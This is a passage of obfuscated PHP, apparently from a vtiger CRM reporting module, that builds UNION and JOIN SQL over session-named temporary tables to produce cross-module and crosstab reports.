$ZZZZZZZZZZZZZZk10[$ZZZZZZZZZZj9[$Zf5]->joinModule]){$ZZZZZZZZZZZZZZj9[$ZZZZZZZZZZZZZZk10[$ZZZZZZZZZZj9[$Zf5]->joinModule]][$Zf5] = $ZZZZZZZZZZj9[$Zf5]->name;$ZZZZZZZZZZZZZZk10[$Zf5+1] = $ZZZZZZZZZZZZZZk10[$ZZZZZZZZZZj9[$Zf5]->joinModule];}else{$ZZZZZZZZZZZZZZk10[$Zf5+1] = $Zf5+1;}} if(!empty($ZZZZZZZZZZZZZZj9)){$this->ZZZZZZZZZZZZZZd3 = array_values(call_user_func_array("array_intersect",$ZZZZZZZZZZZZZZj9));} $this->ZZZZZZZZZZZZZZe4 = array();foreach($ZZZZZZZZZZZZZZj9 as $ZZZZZZZZZZZZZZl11 => $ZZZZZZZZZZZZZZm12){foreach($ZZZZZZZZZZZZZZm12 as $ZZZZZZZZZZZZZZn13 => $ZZZZZZZZZZZZZZo14){if(in_array($ZZZZZZZZZZZZZZo14,$this->ZZZZZZZZZZZZZZd3)){if(!isset($this->ZZZZZZZZZZZZZZe4[$ZZZZZZZZZZZZZZo14])){$this->ZZZZZZZZZZZZZZe4[$ZZZZZZZZZZZZZZo14] = array();} $this->ZZZZZZZZZZZZZZe4[$ZZZZZZZZZZZZZZo14][$ZZZZZZZZZZZZZZl11] = $ZZZZZZZZZZZZZZn13+1;}}} return $ZZS1818;} function ZZZZZZZZZZZZZZp15($module,$ZZZZZx23){$ZZS1818 = unserialize(serialize($ZZZZZx23));$ZZS1818[$module]->joinModule = -1;$ZZT1919 = count($ZZS1818);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if($ZZS1818[$Zf5]->joinModule == $module+1){$ZZS1818[$Zf5]->joinModule=0;}} $this->ZZZZZZZZZZZZZZb1 = array($module+1);$this->ZZZZZZZZZZZZZZc2 = array($module+1 => 0);do{$ZZZz25 = count($this->ZZZZZZZZZZZZZZb1);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if((in_array($ZZS1818[$Zf5]->joinModule,$this->ZZZZZZZZZZZZZZb1)||$ZZS1818[$Zf5]->joinModule==0) && !in_array($Zf5+1,$this->ZZZZZZZZZZZZZZb1)){$this->ZZZZZZZZZZZZZZb1[] = $Zf5+1;$this->ZZZZZZZZZZZZZZc2[$Zf5+1] = count($this->ZZZZZZZZZZZZZZc2);if(!$ZZS1818[$Zf5]->joinModule==0){$ZZS1818[$Zf5]->joinModule = $this->ZZZZZZZZZZZZZZc2[$ZZS1818[$Zf5]->joinModule];}}}}while($ZZZz25 < count($this->ZZZZZZZZZZZZZZb1));$ZZZZZZZZZZZZZZq16 = array();$ZZT1919 = count($this->ZZZZZZZZZZZZZZb1);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZq16[] = $ZZS1818[$this->ZZZZZZZZZZZZZZb1[$Zf5]-1];} return $ZZZZZZZZZZZZZZq16;} function ZZZZZZZZZZZZZZr17($filters){$ZZZz25 = unserialize(serialize($filters));$ZZS1818 = array();$ZZT1919 = count($ZZZz25);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = $ZZZz25[$Zf5];$ZZZZZZZZZZZZZZs18 = count($ZZZz25[$Zf5]->filters);$ZZZZZZZZZZZZZZt19 = array();for($ZZZZZK1010 = 0;$ZZZZZK1010<$ZZZZZZZZZZZZZZs18;$ZZZZZK1010++){$ZZZZZq16 = explode("_",$ZZZz25[$Zf5]->filters[$ZZZZZK1010]->fieldName,2);if(!in_array($ZZZZZq16[0],$this->ZZZZZZZZZZZZZZb1)){$ZZZZZZZZZZZZZZt19[] = $ZZZZZK1010;}else{$ZZZZZq16[0] = $this->ZZZZZZZZZZZZZZc2[$ZZZZZq16[0]];$ZZZz25[$Zf5]->filters[$ZZZZZK1010]->fieldName = $ZZZZZq16[0]."_".$ZZZZZq16[1];}} $ZZZZZZZZZZZZZZs18 = count($ZZZZZZZZZZZZZZt19)-1;for($ZZZZZK1010 = $ZZZZZZZZZZZZZZs18;$ZZZZZK1010>-1;$ZZZZZK1010--){array_splice($ZZS1818[$Zf5]->filters,$ZZZZZZZZZZZZZZt19[$ZZZZZK1010],1);}} return $ZZS1818;} function ZZZZZZZZZZZZZZu20($ZZZc2,$module){$ZZZz25 = unserialize(serialize($ZZZc2));$ZZS1818 = array();$ZZT1919 = count($ZZZz25);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZq16 = explode("_",$ZZZz25[$Zf5],2);if(in_array($ZZZZZq16[0],$this->ZZZZZZZZZZZZZZb1)){$ZZS1818[] = array_search($ZZZZZq16[0],$this->ZZZZZZZZZZZZZZb1)."_".$ZZZZZq16[1];}elseif($ZZZZZq16[0]=="00"){$ZZZZZZZZZZZZZZv21 = explode("_",$ZZZZZq16[1],2);$ZZS1818[] = "0_".$module."_".$ZZZZZZZZZZZZZZv21[1];}} return $ZZS1818;} function ZZZZZZZZZZZZZZw22($ZZZZy24,$module){$ZZZz25 = unserialize(serialize($ZZZZy24));$ZZS1818 = array();$ZZT1919 = count($ZZZz25);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZq16 = explode("_",$ZZZz25[$Zf5]["name"],2);$ZZZZZZZZZZZZZZv21 = explode("_",$ZZZZZq16[1],2);$ZZZZZZZZZZZZZZx23 = $ZZZz25[$Zf5]["name"];if(in_array($ZZZZZq16[0],$this->ZZZZZZZZZZZZZZb1)){$ZZZz25[$Zf5]["name"] = $this->ZZZZZZZZZZZZZZc2[$ZZZZZq16[0]]."_".$ZZZZZq16[1];}elseif(isset($this->ZZZZZZZZZZZZZZe4[$ZZZZZZZZZZZZZZv21[0]])){$ZZZz25[$Zf5]["name"] = $this->ZZZZZZZZZZZZZZc2[$this->ZZZZZZZZZZZZZZe4[$ZZZZZZZZZZZZZZv21[0]][$this->ZZZZZZZZZZZZZZb1[0]]]."_".$ZZZZZq16[1];if(!in_array($ZZZz25[$Zf5]["name"],$this->ZZZZZZZZZZZZZZg6)){$this->ZZZZZZZZZZZZZZg6[] = $ZZZz25[$Zf5]["name"];$this->ZZZZZZZZZZZZZZh7[$ZZZz25[$Zf5]["name"]] = $ZZZZZZZZZZZZZZx23;}}elseif($ZZZz25[$Zf5]["name"] =="00_ALL_assigned_user_id"){$ZZZz25[$Zf5]["name"] = "0_".$module."_assigned_user_id";$this->ZZZZZZZZZZZZZZg6[] = $ZZZz25[$Zf5]["name"];$this->ZZZZZZZZZZZZZZh7[$ZZZz25[$Zf5]["name"]] = $ZZZZZZZZZZZZZZx23;} if(isset($ZZZz25[$Zf5]["aggregate"]) && $ZZZz25[$Zf5]["aggregate"] == $ZZZZZZZZZZZZZZx23){$ZZZz25[$Zf5]["aggregate"] = $ZZZz25[$Zf5]["name"];} $ZZS1818[] = $ZZZz25[$Zf5];} $this->commonFieldsCount = count($this->ZZZZZZZZZZZZZZg6);return $ZZS1818;} function ZZZZZZZZZZZZZZy24($ZZZH77){$ZZZz25 = unserialize(serialize($ZZZH77));$ZZS1818 = array();$ZZT1919 = count($ZZZz25);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZq16 = explode("_",$ZZZz25[$Zf5]["selectedField"],2);if(in_array($ZZZZZq16[0],$this->ZZZZZZZZZZZZZZb1)){$ZZZz25[$Zf5]["selectedField"] = $this->ZZZZZZZZZZZZZZc2[$ZZZZZq16[0]]."_".$ZZZZZq16[1];$ZZS1818[] = $ZZZz25[$Zf5];}} return $ZZS1818;} function ZZZZZZZZZZZZZZz25($ZZq16,$prefix){$ZZZZZZZZZZZZZZA00 = "SELECT DISTINCT `date_field` ";$ZZZZZZZZZZZZZZg6 = "";if(!empty($this->commonFieldsCount)){$ZZZZZZZZZZZZZZg6 = array();$ZZT1919 = $this->commonFieldsCount;for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZg6[] = "c_".$Zf5;if($this->ZZZZZZZZZZZZZZh7[$this->ZZZZZZZZZZZZZZg6[$Zf5]]!=="00_ALL_assigned_user_id"){$ZZZZZq16 = explode("_",$this->ZZZZZZZZZZZZZZg6[$Zf5]);$field = $this->db->ZZU2020($ZZZZZq16[1],$ZZZZZq16[2]);$field["fieldname_org"] = $field["fieldname"];if($this->ZZZZS1818->ZZZZZw22($field,$this->db,false,$ZZZZZq16[1])){$ZZZZZZZZZZZZZZg6[] = "c_".$Zf5."_setype";$ZZZZZZZZZZZZZZg6[] = "c_".$Zf5."_id";}}} $ZZZZZZZZZZZZZZg6 = ", ".implode(", ",$ZZZZZZZZZZZZZZg6);} $ZZZZZZZZZZZZZZA00.= $ZZZZZZZZZZZZZZg6." FROM (";$ZZZZZZZZZZZZZZB11 = array();$ZZT1919 = count($ZZq16);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if($ZZq16[$Zf5]!==null){$ZZZZZZZZZZZZZZB11[] = "SELECT `date_field` $ZZZZZZZZZZZZZZg6 FROM ".$ZZq16[$Zf5]["table"];}} $ZZZZZZZZZZZZZZA00.= implode(" UNION ",$ZZZZZZZZZZZZZZB11);$ZZZZZZZZZZZZZZA00.= ")`date_fields`";$ZZZZZZZZZZZZZZC22 = "CREATE TEMPORARY TABLE IF NOT EXISTS ar_temp_{$prefix}_union AS ($ZZZZZZZZZZZZZZA00)";$this->ZZZZZZZZZZZZZZf5 = "ar_temp_".$prefix."_union";return $ZZZZZZZZZZZZZZC22;} function ZZZZZZZZZZZZZZD33(&$ZZq16,$ZZZZZF55){$ZZZZZZZZZZZZZZE44 = array_keys($ZZq16["cols"]);$ZZZZZZZZZZZZZZA00 = "SELECT ";$ZZZZZZZZZZZZZZA00.= "`combined`.`{$ZZZZZZZZZZZZZZE44[0]}` AS `date_field` ";array_shift($ZZZZZZZZZZZZZZE44);$ZZT1919 = count($ZZZZZZZZZZZZZZE44);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZA00.= ", `combined`.`{$ZZZZZZZZZZZZZZE44[$Zf5]}` AS `c_$Zf5` ";if($ZZZZZZZZZZZZZZE44[$Zf5]!=="00_ALL_assigned_user_id"){$ZZZZZq16 = $this->db->ZZZe4($ZZZZZZZZZZZZZZE44[$Zf5]);$field = $this->db->ZZU2020($ZZZZZq16[1],$ZZZZZq16[2]);$field["fieldname_org"] = $field["fieldname"];if($this->ZZZZS1818->ZZZZZw22($field,$this->db,false,$ZZZZZq16[1])){$ZZZZZZZZZZZZZZA00.=", `combined`.`{$ZZZZZZZZZZZZZZE44[$Zf5]}_setype` AS `c_{$Zf5}_setype` ";$ZZZZZZZZZZZZZZA00.=", `combined`.`{$ZZZZZZZZZZZZZZE44[$Zf5]}_id` AS `c_{$Zf5}_id` ";}}} $ZZZZZZZZZZZZZZA00.= " FROM ({$ZZq16["sql"]}) `combined`";$ZZZZZZZZZZZZZZC22 = "CREATE TEMPORARY TABLE IF NOT EXISTS ar_temp_$ZZZZZF55 AS ($ZZZZZZZZZZZZZZA00)";$ZZq16["table"] = "ar_temp_$ZZZZZF55";$ZZq16["createTmpTable"] = $ZZZZZZZZZZZZZZC22;$ZZq16["fixTable"] = "UPDATE ".$ZZq16["table"]." SET `date_field` ='-' WHERE `date_field` IS NULL";$ZZq16["removeTable"] = "DROP TEMPORARY TABLE IF EXISTS ".$ZZq16["table"];} function ZZZZZZZZZZZZZZF55(&$ZZq16){$ZZZZZZZZZZZZZZE44 = array_keys($ZZq16["cols"]);$ZZZz25 = array_shift($ZZZZZZZZZZZZZZE44);$ZZT1919 = count($ZZZZZZZZZZZZZZE44);$ZZZZZZZZZZZZZZG66 = array($ZZZz25=> $ZZq16["cols"][$ZZZz25]);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZq16 = explode("_",$ZZZZZZZZZZZZZZE44[$Zf5],2);$ZZZZZZZZZZZc2 = array_search($ZZZZZq16[0],$this->ZZZZZZZZZZZZZZc2);$ZZZZZZZZZZZZZZG66[$ZZZZZZZZZZZc2."_".$ZZZZZq16[1]] = $ZZq16["cols"][$ZZZZZZZZZZZZZZE44[$Zf5]];$ZZq16["sql"] = str_replace($ZZZZZZZZZZZZZZE44[$Zf5],$ZZZZZZZZZZZc2."_".$ZZZZZq16[1],$ZZq16["sql"]);} $ZZT1919 = count($ZZq16["fields"]);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZq16 = explode("_",$ZZq16["fields"][$Zf5]["fieldname"],2);$ZZZZZZZZZZZc2 = array_search($ZZZZZq16[0],$this->ZZZZZZZZZZZZZZc2);$ZZq16["fields"][$Zf5]["fieldname"] = $ZZZZZZZZZZZc2."_".$ZZZZZq16[1];$ZZq16["fields"][$Zf5]["module"] = $ZZZZZZZZZZZc2;} $ZZq16["cols"] = $ZZZZZZZZZZZZZZG66;} function ZZZZZZZZZZZZZZH77($ZZZZZZZZZZZZZE44,$ZZZZZZZZZZZZZZI88,$ZZZV2121,$filters,$ZZZZZx23 = array(),$ZZZG66,$ZZZH77,$ZZZZZZZZZZZZW2222 = false){$this->ZZZZZZZZZZZZZZg6 = array();$ZZZZZZZZZZZZZF55 = array();$ZZZZZx23 = $this->ZZZZZZZZZZZZZZp15($ZZZZZZZZZZZZZZI88,$ZZZZZx23);$ZZZZZZZZZZw22 = array_shift($ZZZZZx23);$ZZT1919 = count($ZZZZZx23);$filters = $this->ZZZZZZZZZZZZZZr17($filters);$ZZZV2121 = $this->ZZZZZZZZZZZZZZu20($ZZZV2121,$ZZZZZZZZZZw22->name);$ZZZG66 = $this->ZZZZZZZZZZZZZZw22($ZZZG66,$ZZZZZZZZZZw22->name);$ZZZH77 = $this->ZZZZZZZZZZZZZZy24($ZZZH77);if(count($ZZZV2121)== 0 || count($ZZZH77)== 0 ||count($ZZZG66)== 0){return null;} for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZF55[] = new ZZZZZZZZZZy24($ZZZZZx23[$Zf5]->name,$this->db,$this->ZZZZS1818,$ZZZZZx23[$Zf5]);} $module = new ZZZZZZZZZZx23($ZZZZZZZZZZw22->name,$this->db,$this->ZZZZS1818);$ZZq16 = $ZZZZZZZZZZZZZE44->ZZZZZZZZZZZZV2121($module,$ZZZV2121,$filters,$ZZZZZZZZZZZZZF55,$ZZZG66,$ZZZH77,$ZZZZZZZZZZZZW2222);$this->ZZZZZZZZZZZZZZF55($ZZq16);$ZZq16["commonFields"] = $this->ZZZZZZZZZZZZZZg6;return $ZZq16;} function ZZZZZZZZZZZZZZJ99($ZZZZZZZZZZZZZZK1010, $ZZZZZZZZZZZZZE44, $ZZZZZZZZZZZZZZL1111,$ZZZZZZZZZZZZZZf5,$ZZZG66, $ZZZZZZZZZZZZX2323 = array()){$ZZZZZZZZZZI88 = array();$ZZZZG66 = array();$ZZZZZZZZZZZd3 = array("date_field"=>"Date");$ZZZc2 = array();$ZZT1919 = $this->commonFieldsCount;$ZZZZZZZZZZZZZZg6 = "";$ZZZZZZZZZZZZZZM1212 = $ZZT1919;$field = array();$field["fieldname_org"] = "date_field";$field["fieldname"] = "date_field";$field["module"] = 0;$field["uitype"] = 'date';$ZZZc2[] = $field;if(!empty($ZZZZZZZZZZZZZZL1111[1]["commonFields"])){$ZZZZZZZZZZZZZZg6 = array();for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZg6[] = "`t{{i}}`.`c_".$Zf5."` = `u`.`c_".$Zf5."`";$ZZZZG66[] = "`u`.`c_".$Zf5."` AS `".$this->ZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZL1111[1]["commonFields"][$Zf5]]."`";$ZZZZZq16 = explode("_",$this->ZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZL1111[1]["commonFields"][$Zf5]],3);if($ZZZZZq16[0]=="00"){$field = array("name"=>"00_ALL_assigned_user_id", "column"=>"assigned_user_id", "table"=>"vtiger_crmentity", "uitype"=>53, "type"=>"txt", "title"=>$this->ZZZZS1818->ZZZZZk10("Assigned To",$this->ZZZZZx23[1]->name), "bareTitle"=>$this->ZZZZS1818->ZZZZZk10("Assigned To",$this->ZZZZZx23[1]->name), "availableValues" =>array(),);}else{$field = $this->db->ZZU2020($ZZZZZq16[1],$ZZZZZq16[2]);} $field["fieldname_org"] = $field["fieldname"];$field["fieldname"] = $this->ZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZL1111[1]["commonFields"][$Zf5]];$field["module"] = $ZZZZZq16[0]-1;if($this->ZZZZS1818->ZZZZZw22($field,$this->db,false,$ZZZZZq16[1])){$ZZZZG66[] = "`u`.`c_".$Zf5."_id` AS `".$this->ZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZL1111[1]["commonFields"][$Zf5]]."_id`";$ZZZZG66[] = "`u`.`c_".$Zf5."_setype` AS `".$this->ZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZL1111[1]["commonFields"][$Zf5]]."_setype`";} $ZZZc2[] = $field;if($ZZZZZq16[0]=="00"){$ZZZZZZZZZZZd3[$this->ZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZL1111[1]["commonFields"][$Zf5]]] = "Assigned To";}else{$ZZZZZZZZZZZd3[$this->ZZZZZZZZZZZZZZh7[$ZZZZZZZZZZZZZZL1111[1]["commonFields"][$Zf5]]] = $this->ZZZZS1818->ZZZZZk10($ZZZZZq16[1],$ZZZZZq16[1])." ".$this->ZZZZS1818->ZZZZZk10($field["fieldlabel"],$ZZZZZq16[1]);}} $ZZZZZZZZZZZZZZg6 = " AND ".implode(" AND ",$ZZZZZZZZZZZZZZg6);} array_unshift($ZZZG66,"tmp");$ZZT1919 = count($ZZZZZZZZZZZZZZL1111);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if($ZZZZZZZZZZZZZZL1111[$Zf5]!==null){$ZZZZZZZZZZI88[$Zf5] = "LEFT JOIN ".$ZZZZZZZZZZZZZZL1111[$Zf5]["table"]." `t".$Zf5."` ON (`t".$Zf5."`.`date_field`=`u`.`date_field` ".str_replace("{{i}}",$Zf5,$ZZZZZZZZZZZZZZg6).")";$ZZZZZZZZZZZZZZE44 = array_keys($ZZZZZZZZZZZZZZL1111[$Zf5]["cols"]);array_shift($ZZZZZZZZZZZZZZE44);$ZZZZZZZZZZZZZZs18 = count($ZZZZZZZZZZZZZZE44);for($ZZZZZK1010 = 0;$ZZZZZK1010<$ZZZZZZZZZZZZZZM1212;$ZZZZZK1010++){array_shift($ZZZZZZZZZZZZZZE44);} for($ZZZZZK1010=$ZZZZZZZZZZZZZZM1212;$ZZZZZK1010<$ZZZZZZZZZZZZZZs18;$ZZZZZK1010++){$ZZZZG66[] = "`t".$Zf5."`.`c_".$ZZZZZK1010."` AS `".$ZZZZZZZZZZZZZZE44[$ZZZZZK1010-$ZZZZZZZZZZZZZZM1212]."`";$ZZZZZZZZZZZd3[$ZZZZZZZZZZZZZZE44[$ZZZZZK1010-$ZZZZZZZZZZZZZZM1212]] = $ZZZZZZZZZZZZZZL1111[$Zf5]["cols"][$ZZZZZZZZZZZZZZE44[$ZZZZZK1010-$ZZZZZZZZZZZZZZM1212]];} array_shift($ZZZG66);}} $ZZZZH77 = array();$ZZT1919 = count($ZZZc2);if($ZZZG66[0]["sortAction"] =="groupsort"){if($ZZZG66[0]["sortDirection"]=="DESC"){$ZZZZZZZM1212 = "DESC";}else{$ZZZZZZZM1212 = "ASC";} if(isset($ZZZG66[0]["dateGrouping"]) && ($ZZZG66[0]["dateGrouping"]=="monthAndYear" ||$ZZZG66[0]["dateGrouping"]=="weekAndYear")){$ZZZZH77[] = "LEFT(`u`.`date_field`,4) $ZZZZZZZM1212, CAST(MID(`u`.`date_field`,6,2) AS UNSIGNED) $ZZZZZZZM1212";}else{$ZZZZH77[] = "`u`.`date_field` $ZZZZZZZM1212 ";}} for($Zf5=1;$Zf5<$ZZT1919;$Zf5++){if($ZZZc2[$Zf5]["fieldname"]== $ZZZG66[$Zf5]["name"]){if($ZZZG66[$Zf5]["sortAction"] =="groupsort"){if($ZZZG66[$Zf5]["sortDirection"]=="DESC"){$ZZZZH77[] = "`u`.c_".($Zf5-1)." DESC ";}else{$ZZZZH77[] = "`u`.c_".($Zf5-1)." ASC ";}}}} if(!empty($ZZZZH77)){$ZZZZH77 = " ORDER BY ".implode(" ,",$ZZZZH77);}else{$ZZZZH77 = "";} $ZZq16 = "SELECT `u`.`date_field`, ";$ZZq16.= implode(", ",$ZZZZG66);$ZZq16.= "FROM ".$ZZZZZZZZZZZZZZf5." `u` ";$ZZq16.= implode(" ",$ZZZZZZZZZZI88).$ZZZZH77;$ZZZz25 = $this->db->ZZZA00($ZZZZZZZZZZZZZZK1010,array());$ZZZZZZZZZZZZZf5 = $ZZZZZZZZZZZZZE44->ZZZZZZZZZZZZZg6($ZZq16, array(), $ZZZZZZZZZZZZX2323);$ZZq16.= $ZZZZZZZZZZZZZf5["sql"];$ZZZZZZZZZZZZZZN1313 = "DROP TEMPORARY TABLE IF EXISTS ".$this->ZZZZZZZZZZZZZZf5;return array("sql" => $ZZq16, "params" => array(), "cols" => $ZZZZZZZZZZZd3, "fields" => $ZZZc2, "removeTable" => $ZZZZZZZZZZZZZZN1313, "meta" => $ZZZZZZZZZZZZZf5["meta"],);} function ZZZZZZZZZZZZZZO1414($ZZZZZx23){$this->ZZZZZZZZZZZZZZi8($ZZZZZx23);$ZZS1818 = array();foreach($this->ZZZZZZZZZZZZZZa0 as $ZZZZZZZZZZZZZZl11){$ZZS1818[] = $ZZZZZZZZZZZZZZl11+1;} return $ZZS1818;} function ZZZZZZZZZZZZZZP1515($ZZZZZx23){$ZZZZZZZZZZZZZZQ1616 = $this->ZZZZZZZZZZZZZZO1414($ZZZZZx23);$ZZZZZZZZZZZZZZR1717 = array();$ZZZZZZZZZZZZZZS1818 = array("00");$ZZS1818 = array();$ZZT1919 = count($ZZZZZx23);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){if(in_array($ZZZZZx23[$Zf5]->name,$this->ZZZZZZZZZZZZZZd3)){$ZZZZZZZZZZZZZZS1818[] = $Zf5+1;if(in_array($ZZZZZx23[$Zf5]->name,$ZZZZZZZZZZZZZZR1717)){$ZZS1818[] = $Zf5;}else{$ZZZZZZZZZZZZZZR1717[] = $ZZZZZx23[$Zf5]->name;}}} return array("skip"=>$ZZS1818,"common"=>$this->ZZZZZZZZZZZZZZd3,"commonIds"=>$ZZZZZZZZZZZZZZS1818);} function ZZZZZZZZZZZZZZT1919($ZZZc2){$this->ZZZR1717 = $ZZZc2;} function ZZZZZZZZZZZZZZU2020(&$ZZZZy24){$ZZZZZq16 = null;$ZZT1919 = count($this->ZZZR1717);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if(in_array($ZZZZy24[0]["name"],$this->ZZZR1717)){$ZZZZZq16 = array_shift($ZZZZy24);}}} function ZZZZZZZZZZZZZA00($module,$ZZZV2121,$filters,$ZZZZZx23 = array(),$ZZZG66,$ZZZH77,$ZZZZZZZZZZZZW2222 = false,$isCrosstab = true,$ZZZZZZZZZZZZZB11 = true,$aggregateColumn = false, $dateFormat = "yyyy-mm-dd", $ZZZZZZZZZZZZZC22 = false, $ZZZM1212 = array(), $ZZZZZZZZZZZZX2323 = array(), ARUser $ZZZZZZZZZZZZZD33){$ZZZZZZZZZZZZZE44 = new ZZZZZZZZZZG66($this->db,$this->ZZZZS1818,true, $ZZZZZZZZZZZZZD33);$ZZZZZZX2323 = $this->ZZZZZZZZZZZZZZi8($ZZZZZx23);$ZZZZZZZZZZZZZZV2121 = str_replace('-', '_', session_id());$ZZq16 = array();for($Zf5 = 0;$Zf5<$ZZZZZZX2323;$Zf5++){$ZZq16[$Zf5] = $this->ZZZZZZZZZZZZZZH77($ZZZZZZZZZZZZZE44,$this->ZZZZZZZZZZZZZZa0[$Zf5],$ZZZV2121,$filters,$ZZZZZx23,$ZZZG66,$ZZZH77,$ZZZZZZZZZZZZW2222);} for($Zf5 = 0;$Zf5<$ZZZZZZX2323;$Zf5++){if($ZZq16[$Zf5]!==null){$this->ZZZZZZZZZZZZZZD33($ZZq16[$Zf5],$Zf5.$ZZZZZZZZZZZZZZV2121);}} for($Zf5 = 0;$Zf5<$ZZZZZZX2323;$Zf5++){if($ZZq16[$Zf5]!==null){$ZZZz25 = $this->db->ZZZA00($ZZq16[$Zf5]["removeTable"],array());$ZZZz25 = $this->db->ZZZA00($ZZq16[$Zf5]["createTmpTable"],$ZZq16[$Zf5]["params"]);$ZZZz25 = $this->db->ZZZA00($ZZq16[$Zf5]["fixTable"],array());}} $ZZZZZZZZZZZZZZK1010 = $this->ZZZZZZZZZZZZZZz25($ZZq16,"report".$ZZZZZZZZZZZZZZV2121);$ZZZZZZZZZZZZZZW2222 = $this->ZZZZZZZZZZZZZZJ99($ZZZZZZZZZZZZZZK1010, $ZZZZZZZZZZZZZE44, $ZZq16,$this->ZZZZZZZZZZZZZZf5,$ZZZG66,$ZZZZZZZZZZZZX2323);$ZZZz25 = $this->db->ZZZA00($ZZZZZZZZZZZZZZW2222["removeTable"],array());$ZZZz25 = $this->db->ZZZA00($ZZZZZZZZZZZZZZK1010,array());$ZZS1818 = $this->db->ZZZw22($ZZZZZZZZZZZZZZW2222["sql"],array());for($Zf5 = 0;$Zf5<$ZZZZZZX2323;$Zf5++){$ZZZz25 = $this->db->ZZZA00($ZZq16[$Zf5]["removeTable"],array());} $ZZZz25 = $this->db->ZZZA00($ZZZZZZZZZZZZZZW2222["removeTable"],array());$ZZT1919 = count($ZZZZZx23);$ZZZZZZZZZZZZZF55 = array();for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZF55[] = new ZZZZZZZZZZy24($ZZZZZx23[$Zf5]->name,$this->db,$this->ZZZZS1818,$ZZZZZx23[$Zf5]);} $ZZZZZZZZZZZZZG66 = new ZZZZZZZZZZZZZH77($ZZZG66,$ZZZZZZZZZZZZZZW2222["fields"],$ZZZZZZZZZZZZW2222);$ZZZZZZZZZZZZZG66->ZZZZZZZZZZZZZI88($ZZS1818);$ZZZG66[] = array("name"=>"date_field","dateGrouping"=>$ZZZG66[0]["dateGrouping"],"sortAction"=>$ZZZG66[0]["sortAction"],"position" =>$ZZZG66[0]["position"]);$ZZZZZZZZZZZZZJ99 = new ZZZZZZZZZZZZZK1010($this->ZZZZS1818,$this->db,$ZZZZZZZZZZZZZZW2222["fields"],$ZZZG66,$ZZZZZZZZZZZZZF55,$dateFormat,$ZZZZZZZZZZZZZC22);$ZZZZZZZZZZZZZJ99->ZZZZZZZZZZZZZI88($ZZS1818);if($ZZZG66[0]["sortAction"]=="nogroup"){unset($ZZZZZZZZZZZZZZW2222["cols"]['date_field']);} $ZZS1818 = array("cols" => $this->ZZZZZZZZZZZZZx23($ZZZZZZZZZZZZZZW2222["cols"]), "data" => $ZZS1818);if($isCrosstab && count($ZZS1818["data"])>0){$this->ZZZZZZZZZZZZZZU2020($ZZZG66);if($aggregateColumn){$ZZZZZZZZZZZZZL1111 = new ZZZZZZZZZZZZZM1212($this->db,$this->ZZZZS1818,$ZZZZZZZZZZZZZF55);}else{$ZZZZZZZZZZZZZL1111 = new ZZZZZZZZZZZZZN1313($this->db,$this->ZZZZS1818,$ZZZZZZZZZZZZZF55);} $ZZS1818 = $ZZZZZZZZZZZZZL1111->ZZZZZZZZZZZZZO1414($ZZS1818,$ZZZG66,$ZZZH77,$ZZZZZZZZZZZZZZW2222["fields"]);} $ZZS1818["cols"] = $this->ZZZZZZZZZZZZZx23($ZZS1818["cols"]);$ZZS1818["meta"] = $ZZZZZZZZZZZZZZW2222["meta"];$ZZS1818["pdffields"] = $this->ZZZZZZZZZZZZZQ1616($ZZZZZZZZZZZZZF55, $ZZS1818["cols"], $ZZS1818["data"], $isCrosstab, $aggregateColumn);if($ZZZZZZZZZZZZZB11){$ZZZZZZZZZZZZZJ99 = new ZZZZZZZZZZZZZP1515();$ZZZZZZZZZZZZZJ99->ZZZZZZZZZZZZZI88($ZZS1818["data"]);} return $ZZS1818;}} class ZZZZZZZZZZZZZN1313{protected $ZZZZZZZZZZZZZZX2323;protected $ZZZH77;protected $ZZZZZZZZZZZZZZY2424;protected $ZZZZS1818;protected $db;protected $ZZZZZZZZZZj9;function __construct($db, $ZZZZS1818,$ZZZZZZZZZZj9) {$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;$this->ZZZZZZZZZZj9 = $ZZZZZZZZZZj9;} function ZZZZZZZZZZZZZZZ2525($ZZZZZZZZZZZZZZZa0,$ZZZZZZZZZZZZZZX2323){$ZZZZZZZZZZZZZZZb1 = count($ZZZZZZZZZZZZZZZa0);$ZZS1818 = array();for($Zf5=0;$Zf5<$ZZZZZZZZZZZZZZZb1;$Zf5++){$ZZS1818[$ZZZZZZZZZZZZZZZa0[$Zf5]] = array();} $ZZT1919 = count($ZZZZZZZZZZZZZZX2323);for($Zf5=0;$Zf5<$ZZT1919;$Zf5++){for($ZZZZZK1010=0;$ZZZZZK1010<$ZZZZZZZZZZZZZZZb1;$ZZZZZK1010++){if(!in_array($ZZZZZZZZZZZZZZX2323[$Zf5][$ZZZZZZZZZZZZZZZa0[$ZZZZZK1010]],$ZZS1818[$ZZZZZZZZZZZZZZZa0[$ZZZZZK1010]])){$ZZS1818[$ZZZZZZZZZZZZZZZa0[$ZZZZZK1010]][] = $ZZZZZZZZZZZZZZX2323[$Zf5][$ZZZZZZZZZZZZZZZa0[$ZZZZZK1010]];}}} return $ZZS1818;} function ZZZZZZZZZZZZZZZc2($ZZZZZn13,$ZZZZZZZZZZZZZZZd3 = false){$ZZZz25 = 